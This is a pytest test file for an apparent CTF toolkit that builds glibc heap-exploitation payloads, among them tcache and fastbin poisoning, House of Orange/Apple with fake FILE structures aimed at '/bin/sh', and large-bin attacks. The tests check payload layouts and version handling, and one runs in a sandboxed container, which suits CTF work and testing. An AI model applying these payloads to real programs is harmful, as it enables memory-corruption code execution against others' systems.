from __future__ import annotations

import base64
import hashlib
import json
import os
import struct
import subprocess
import sys
from pathlib import Path

import pytest


ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "solvers" / "toolkits"))

import heap_families as heap  # noqa: E402


def _word(data: bytes, offset: int, bits: int = 64) -> int:
    return struct.unpack_from("<Q" if bits == 64 else "<I", data, offset)[0]


def _samples() -> list[heap.HeapBuild]:
    return [
        heap.build_tcache_dup(glibc_version="2.31", chunk_addr=0x55555000,
                              chunk_size=0x90, next_chunk_addr=0x55555100),
        heap.build_tcache_poison(glibc_version="2.35", freed_chunk_addr=0x55555200,
                                 chunk_size=0x90, target_addr=0x404040),
        heap.build_fastbin_dup(glibc_version="2.35", chunk_addr=0x55555300,
                               chunk_size=0x70, next_chunk_addr=0x55555400),
        heap.build_fastbin_poison(glibc_version="2.35", victim_chunk_addr=0x55555500,
                                  fake_chunk_addr=0x404100, chunk_size=0x70),
        heap.build_unsorted_bin_leak(glibc_version="2.37", chunk_addr=0x55556000,
                                     chunk_size=0x500, main_arena_addr=0x7FFFF7FABC00),
        heap.build_house_of_force(glibc_version="2.28", top_chunk_addr=0x55557000,
                                  target_addr=0x55558010),
        heap.build_house_of_orange(
            glibc_version="2.23", old_top_addr=0x55559000, old_top_size=0x500,
            main_arena_bin_addr=0x7FFFF7FABC60, io_list_all_addr=0x7FFFF7FAD660,
            fake_file_addr=0x5555A000, fake_vtable_addr=0x5555A100,
            call_target=0x7FFFF7E12340, lock_addr=0x5555A200,
        ),
        heap.build_house_of_apple(
            glibc_version="2.37", fake_file_addr=0x5555B000, wide_data_addr=0x5555B100,
            wide_vtable_addr=0x5555B200, io_wfile_jumps_addr=0x7FFFF7FA10C0,
            call_target=0x7FFFF7E12340, lock_addr=0x5555B300,
        ),
        heap.build_house_of_einherjar(
            glibc_version="2.31", fake_chunk_addr=0x5555C000,
            victim_chunk_addr=0x5555C100, victim_chunk_size=0x90,
        ),
        heap.build_house_of_botcake(
            glibc_version="2.35", overlapping_chunk_addr=0x5555D000,
            chunk_size=0x100, target_addr=0x404080,
        ),
        heap.build_house_of_spirit(
            glibc_version="2.35", fake_chunk_addr=0x404200, chunk_size=0x90,
        ),
        heap.build_large_bin_attack(
            glibc_version="2.29", large_chunk_addr=0x5555E000, chunk_size=0x500,
            target_addr=0x4040C0, fd_addr=0x7FFFF7FAD000, bk_addr=0x7FFFF7FAD000,
        ),
        heap.build_tcache_stashing_unlink(
            glibc_version="2.31", smallbin_chunk_addr=0x5555F000, chunk_size=0x90,
            target_addr=0x404100, smallbin_head_addr=0x7FFFF7FAD100,
        ),
    ]


def _assert_result_contract(result: heap.HeapBuild) -> None:
    assert isinstance(result.payload, bytes) and 0 < len(result.payload) <= heap.MAX_PAYLOAD
    payload, placements = result
    assert payload == result.payload and placements == result.placements
    occupied: list[tuple[int, int]] = []
    for name, item in result.placement_map.items():
        start, length = item["payload_offset"], item["length"]
        assert start % (result.bits // 8) == 0
        assert result.segment(name) == result.payload[start:start + length]
        assert all(start >= old_end or start + length <= old_start
                   for old_start, old_end in occupied)
        occupied.append((start, start + length))
        for field_name, field in item["fields"].items():
            raw = result.payload[field["payload_offset"]:field["payload_offset"] + field["size"]]
            assert int.from_bytes(raw, "little") == field["value"], (name, field_name)
            assert result.placements[f"{name}.{field_name}"] == field["payload_offset"]
    compact = result.as_payload_build()
    assert compact.payload == result.payload
    assert dict(compact.placements) == dict(result.placements)
    assert compact.strategy == result.technique
    assert json.loads(result.to_json())["payload_hex"] == result.payload.hex()
    assert result.to_json() == result.to_json()


def test_every_heap_family_has_a_deterministic_uniform_payload_contract() -> None:
    samples = _samples()
    assert {item.technique for item in samples} == set(heap.BUILDERS)
    for item in samples:
        _assert_result_contract(item)


def test_tcache_poisoning_switches_to_protect_ptr_at_glibc_232() -> None:
    kwargs = dict(freed_chunk_addr=0x55555000, chunk_size=0x90, target_addr=0x404040)
    plain = heap.build_tcache_poison(glibc_version="2.31", **kwargs)
    safe = heap.build_tcache_poison(glibc_version="2.32", **kwargs)
    slot = kwargs["freed_chunk_addr"] + 0x10
    assert _word(plain.payload, 0) == kwargs["target_addr"]
    assert _word(safe.payload, 0) == kwargs["target_addr"] ^ (slot >> 12)
    assert safe.facts["stored_next"] ^ (slot >> 12) == kwargs["target_addr"]
    assert plain.facts["safe_linking"] is False and safe.facts["safe_linking"] is True


def test_tcache_dup_models_key_bypass_and_32_bit_metadata() -> None:
    modern = heap.build_tcache_dup(
        glibc_version="2.31", chunk_addr=0x100000, chunk_size=0x90,
        next_chunk_addr=0x100100, tcache_key=0,
    )
    assert _word(modern.payload, 0) == 0x100100
    assert _word(modern.payload, 8) == 0
    assert "key" in modern.compatibility

    lp32 = heap.build_tcache_dup(
        glibc_version="2.32", bits=32, chunk_addr=0x10000, chunk_size=0x20,
        next_chunk_addr=0x10100,
    )
    assert lp32.payload == struct.pack("<II", 0x10100 ^ (0x10008 >> 12), 0)
    _assert_result_contract(lp32)


def test_fastbin_dup_and_poison_include_checked_headers_and_following_chunk() -> None:
    dup = heap.build_fastbin_dup(
        glibc_version="2.35", chunk_addr=0x55555000, chunk_size=0x70,
        next_chunk_addr=0x55555100,
    )
    assert _word(dup.segment("fastbin_chunk"), 8) == 0x71
    assert _word(dup.segment("fastbin_chunk"), 16) == 0x55555100 ^ (0x55555010 >> 12)

    poison = heap.build_fastbin_poison(
        glibc_version="2.31", victim_chunk_addr=0x55555200,
        fake_chunk_addr=0x404000, chunk_size=0x70,
    )
    assert _word(poison.segment("poisoned_fastbin_victim"), 16) == 0x404000
    assert _word(poison.segment("fake_fastbin_chunk"), 8) == 0x71
    assert poison.placement_map["fake_fastbin_next"]["address"] == 0x404070
    assert _word(poison.segment("fake_fastbin_next"), 0) == 0x70


def test_unsorted_leak_and_house_of_force_arithmetic_are_explicit() -> None:
    leak = heap.build_unsorted_bin_leak(
        glibc_version="2.37", chunk_addr=0x55555000, chunk_size=0x500,
        main_arena_addr=0x7FFFF7FABC00, bin_link_offset=0x60,
    )
    assert _word(leak.payload, 16) == 0x7FFFF7FABC60
    assert _word(leak.payload, 24) == 0x7FFFF7FABC60
    assert leak.facts["main_arena_subtract"] == 0x60

    force = heap.build_house_of_force(
        glibc_version="2.28", top_chunk_addr=0x100000, target_addr=0x101010,
    )
    assert _word(force.payload, 8) == (1 << 64) - 1
    assert force.facts["bridge_chunk_size"] == 0x1000
    assert force.facts["request_interval_min"] == 0xFE9
    assert force.facts["request_interval_max"] == 0xFF8
    hardened = heap.build_house_of_force(
        glibc_version="2.37", top_chunk_addr=0x100000, target_addr=0x101010,
    )
    assert "rejects" in hardened.compatibility


def test_orange_and_apple_file_offsets_are_layout_checked() -> None:
    orange = _samples()[6]
    assert _word(orange.segment("old_top_unsorted"), 24) == 0x7FFFF7FAD650
    fake_file = orange.segment("fake_file")
    assert fake_file.startswith(b"/bin/sh\x00")
    assert _word(fake_file, 0x28) == 1
    assert _word(fake_file, 0x88) == 0x5555A200
    assert _word(fake_file, 0xD8) == 0x5555A100
    assert _word(orange.segment("fake_vtable"), 0x18) == 0x7FFFF7E12340

    apple = _samples()[7]
    fake_file = apple.segment("fake_file")
    wide = apple.segment("fake_wide_data")
    assert fake_file.startswith(b"  /bin/sh\x00")
    assert _word(fake_file, 0xA0) == 0x5555B100
    assert _word(fake_file, 0xD8) == 0x7FFFF7FA10C0
    assert _word(wide, 0xE0) == 0x5555B200
    assert _word(apple.segment("fake_wide_vtable"), 0x68) == 0x7FFFF7E12340


def test_einherjar_botcake_and_spirit_encode_overlap_primitives() -> None:
    einherjar = _samples()[8]
    assert _word(einherjar.segment("fake_previous_chunk"), 16) == 0x5555C000
    assert _word(einherjar.segment("fake_previous_chunk"), 24) == 0x5555C000
    assert _word(einherjar.segment("victim_header"), 0) == 0x100
    assert _word(einherjar.segment("victim_header"), 8) & heap.PREV_INUSE == 0

    botcake = _samples()[9]
    slot = 0x5555D010
    assert _word(botcake.payload, 0) == 0x404080 ^ (slot >> 12)
    assert _word(botcake.payload, 8) == 0

    spirit = _samples()[10]
    assert spirit.facts["fake_user_address"] == 0x404210
    assert _word(spirit.segment("fake_chunk"), 8) == 0x91
    assert _word(spirit.segment("following_chunk"), 0) == 0x90


def test_largebin_and_stashing_maps_make_write_lvalues_reviewable() -> None:
    large = _samples()[11]
    assert _word(large.segment("forged_largebin_chunk"), 0x28) == 0x4040A0
    assert large.facts["write_target"] == 0x4040C0
    stash = _samples()[12]
    assert _word(stash.segment("corrupted_smallbin_chunk"), 0x18) == 0x4040F0
    assert stash.facts["write_target"] == 0x404100


@pytest.mark.parametrize(
    ("call", "message"),
    [
        (lambda: heap.build_heap("unknown"), "unknown heap technique"),
        (lambda: heap.build_tcache_dup(glibc_version="2.25", chunk_addr=1, chunk_size=0x20),
         "tcache"),
        (lambda: heap.build_house_of_force(glibc_version="2.37", top_chunk_addr=0x2000,
                                           target_addr=0x1000), "must follow"),
        (lambda: heap.build_house_of_spirit(glibc_version="2.37", fake_chunk_addr=0x1000,
                                            chunk_size=0x91), "aligned"),
        (lambda: heap.build_house_of_apple(
            glibc_version="2.23", fake_file_addr=1, wide_data_addr=2, wide_vtable_addr=3,
            io_wfile_jumps_addr=4, call_target=5, lock_addr=6), "requires glibc"),
        (lambda: heap.build_large_bin_attack(
            glibc_version="2.37", large_chunk_addr=0x1000, chunk_size=0x90,
            target_addr=0x2000, fd_addr=0x3000, bk_addr=0x3000), "too small"),
    ],
)
def test_invalid_or_inapplicable_heap_templates_fail_closed(call, message) -> None:
    with pytest.raises(heap.HeapBuildError, match=message):
        call()


def test_dispatch_aliases_are_deterministic() -> None:
    direct = heap.build_tcache_poison(
        glibc_version="2.35", freed_chunk_addr=0x55555000,
        chunk_size=0x90, target_addr=0x404040,
    )
    dispatched = heap.build_heap(
        "tcache-poisoning", glibc_version="2.35", freed_chunk_addr=0x55555000,
        chunk_size=0x90, target_addr=0x404040,
    )
    assert direct == dispatched


def test_tcache_key_layout_tracks_the_glibc_229_boundary() -> None:
    early = heap.build_tcache_dup(
        glibc_version="2.28", chunk_addr=0x55555000,
        chunk_size=0x90, next_chunk_addr=0x55555100,
    )
    keyed = heap.build_tcache_dup(
        glibc_version="2.29", chunk_addr=0x55555000,
        chunk_size=0x90, next_chunk_addr=0x55555100,
    )
    assert len(early.payload) == 8
    assert "key" not in early.placement_map["freed_tcache_entry"]["fields"]
    assert len(keyed.payload) == 16
    assert "key" in keyed.placement_map["freed_tcache_entry"]["fields"]
    assert early.facts["has_tcache_key"] is False
    assert keyed.facts["has_tcache_key"] is True
    with pytest.raises(heap.HeapBuildError, match="does not exist"):
        heap.build_tcache_dup(
            glibc_version="2.28", chunk_addr=0x55555000,
            chunk_size=0x90, tcache_key=1,
        )

    poison = heap.build_tcache_poison(
        glibc_version="2.28", freed_chunk_addr=0x55555000,
        chunk_size=0x90, target_addr=0x404040,
    )
    assert len(poison.payload) == 8
    assert poison.facts["key_serialized"] is False


def test_target_ranges_alignment_and_bin_limits_fail_closed() -> None:
    with pytest.raises(heap.HeapBuildError, match="overlaps"):
        heap.build_house_of_apple(
            glibc_version="2.37", fake_file_addr=0x5555B000,
            wide_data_addr=0x5555B080, wide_vtable_addr=0x5555B300,
            io_wfile_jumps_addr=0x7FFFF7FA10C0,
            call_target=0x7FFFF7E12340, lock_addr=0x5555B400,
        )
    with pytest.raises(heap.HeapBuildError, match="malloc alignment"):
        heap.build_tcache_poison(
            glibc_version="2.37", freed_chunk_addr=0x55555000,
            chunk_size=0x90, target_addr=0x404041,
        )
    with pytest.raises(heap.HeapBuildError, match="fastbin maximum"):
        heap.build_fastbin_dup(
            glibc_version="2.37", chunk_addr=0x55555000,
            chunk_size=0x500, next_chunk_addr=0x55556000,
        )
    with pytest.raises(heap.HeapBuildError, match="tcache maximum"):
        heap.build_tcache_poison(
            glibc_version="2.37", freed_chunk_addr=0x55555000,
            chunk_size=0x500, target_addr=0x404040,
        )
    tuned = heap.build_fastbin_dup(
        glibc_version="2.31", chunk_addr=0x55555000,
        chunk_size=0xA0, next_chunk_addr=0x55556000,
        max_fast_chunk_size=0xA0,
    )
    assert tuned.facts["chunk_size"] == 0xA0


def test_safe_linking_custom_slots_and_family_transition() -> None:
    custom_slot = 0x55557000
    target = 0x404040
    poison = heap.build_tcache_poison(
        glibc_version="2.35", freed_chunk_addr=0x55555000,
        fd_slot_addr=custom_slot, chunk_size=0x90, target_addr=target,
    )
    assert _word(poison.payload, 0) == target ^ (custom_slot >> 12)

    fast_plain = heap.build_fastbin_poison(
        glibc_version="2.31", victim_chunk_addr=0x55558000,
        fake_chunk_addr=0x404100, chunk_size=0x70,
    )
    fast_safe = heap.build_fastbin_poison(
        glibc_version="2.32", victim_chunk_addr=0x55558000,
        fake_chunk_addr=0x404100, chunk_size=0x70,
    )
    assert _word(fast_plain.segment("poisoned_fastbin_victim"), 16) == 0x404100
    assert _word(fast_safe.segment("poisoned_fastbin_victim"), 16) == 0x404100 ^ (0x55558010 >> 12)

    bot_plain = heap.build_house_of_botcake(
        glibc_version="2.31", overlapping_chunk_addr=0x55559000,
        chunk_size=0x100, target_addr=0x404080,
    )
    bot_safe = heap.build_house_of_botcake(
        glibc_version="2.32", overlapping_chunk_addr=0x55559000,
        chunk_size=0x100, target_addr=0x404080,
    )
    assert _word(bot_plain.payload, 0) == 0x404080
    assert _word(bot_safe.payload, 0) == 0x404080 ^ (0x55559010 >> 12)


def test_rich_result_is_deeply_immutable_and_version_is_exact() -> None:
    result = heap.build_tcache_poison(
        glibc_version="2.35", freed_chunk_addr=0x55555000,
        chunk_size=0x90, target_addr=0x404040,
    )
    with pytest.raises(TypeError):
        result.facts["target"] = 1
    with pytest.raises(TypeError):
        result.placement_map["poisoned_tcache_entry"]["address"] = 1
    with pytest.raises(TypeError):
        result.placement_map["poisoned_tcache_entry"]["fields"]["next"]["value"] = 1
    assert json.loads(result.to_json())["facts"]["target"] == 0x404040
    with pytest.raises(heap.HeapBuildError, match="MAJOR.MINOR"):
        heap.build_tcache_poison(
            glibc_version="2.35.1", freed_chunk_addr=0x55555000,
            chunk_size=0x90, target_addr=0x404040,
        )


def test_lp32_bin_bound_and_largebin_compatibility_boundary() -> None:
    # 0x50 is the LP32 tunable ceiling, not the default (0x40); reach it via an
    # explicit mallopt/max_fast_chunk_size, matching glibc set_max_fast semantics.
    lp32 = heap.build_fastbin_dup(
        glibc_version="2.31", bits=32, chunk_addr=0x10000,
        chunk_size=0x50, next_chunk_addr=0x10100, max_fast_chunk_size=0x50,
    )
    assert lp32.bits == 32 and len(lp32.segment("fastbin_chunk")) == 12
    with pytest.raises(heap.HeapBuildError, match="aligned"):
        heap.build_fastbin_dup(
            glibc_version="2.31", bits=32, chunk_addr=0x10000,
            chunk_size=0x54, next_chunk_addr=0x10100,
        )
    with pytest.raises(heap.HeapBuildError, match="fastbin maximum"):
        heap.build_fastbin_dup(
            glibc_version="2.31", bits=32, chunk_addr=0x10000,
            chunk_size=0x60, next_chunk_addr=0x10100,
        )
    kwargs = dict(
        large_chunk_addr=0x5555E000, chunk_size=0x500,
        target_addr=0x4040C0, fd_addr=0x7FFFF7FAD000,
        bk_addr=0x7FFFF7FAD000,
    )
    assert "classic" in heap.build_large_bin_attack(glibc_version="2.29", **kwargs).compatibility
    assert "hardened" in heap.build_large_bin_attack(glibc_version="2.30", **kwargs).compatibility


@pytest.mark.skipif(
    os.environ.get("CTF_R5B_DOCKER_VERIFY") != "1",
    reason="set CTF_R5B_DOCKER_VERIFY=1 for networkless payload round-trip verification",
)
def test_every_heap_builder_roundtrips_in_sacrificial_networkless_container() -> None:
    """No heap payload is executable; verify its bytes/map in the pinned sacrificial image."""
    samples = _samples()
    manifest = []
    for result in samples:
        manifest.append({
            "technique": result.technique,
            "payload": base64.b64encode(result.payload).decode("ascii"),
            "sha256": hashlib.sha256(result.payload).hexdigest(),
            "placements": result.as_dict()["placement_map"],
        })
    encoded = base64.b64encode(json.dumps(manifest, sort_keys=True).encode()).decode("ascii")
    script = r'''import base64, hashlib, json, sys
rows = json.loads(base64.b64decode(sys.argv[1], validate=True))
for row in rows:
    raw = base64.b64decode(row["payload"], validate=True)
    assert hashlib.sha256(raw).hexdigest() == row["sha256"]
    for segment in row["placements"].values():
        start, length = segment["payload_offset"], segment["length"]
        assert len(raw[start:start + length]) == length
        for field in segment["fields"].values():
            off, size = field["payload_offset"], field["size"]
            assert int.from_bytes(raw[off:off + size], "little") == field["value"]
print("R5B_HEAP_PAYLOADS_ROUNDTRIP_OK:%d" % len(rows))
'''
    command = [
        "docker", "run", "--pull=never", "--rm", "--network", "none",
        "--read-only", "--cap-drop", "ALL", "--security-opt", "no-new-privileges",
        "--pids-limit", "32", "--memory", "128m", "csctf-sandbox:2",
        "python3", "-c", script, encoded,
    ]
    completed = subprocess.run(command, check=False, capture_output=True, text=True, timeout=45)
    assert completed.returncode == 0, completed.stderr
    assert completed.stdout.strip() == f"R5B_HEAP_PAYLOADS_ROUNDTRIP_OK:{len(samples)}"
